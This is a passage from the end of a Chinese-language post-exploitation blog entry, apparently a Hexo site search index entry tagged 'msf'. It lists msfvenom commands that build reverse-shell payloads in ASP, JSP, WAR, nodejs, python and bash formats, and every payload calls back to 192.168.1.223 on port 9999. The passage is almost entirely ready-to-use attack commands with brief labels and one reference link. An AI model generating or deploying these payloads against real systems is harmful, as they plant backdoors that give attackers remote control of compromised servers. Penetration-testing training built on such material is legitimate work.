<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h5 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h4 id="各种语言的脚本"><a href="#各种语言的脚本" class="headerlink" title="各种语言的脚本"></a>各种语言的脚本</h4><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一种Linux下使用python反弹一个cmd形式的shell:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">第二种反弹一个meterpreter形式的shell(windows|Linux都可以):</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://mature-sec.com/post/msfvenom使用小结/" target="_blank" rel="noopener">https://mature-sec.com/post/msfvenom%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
</search>
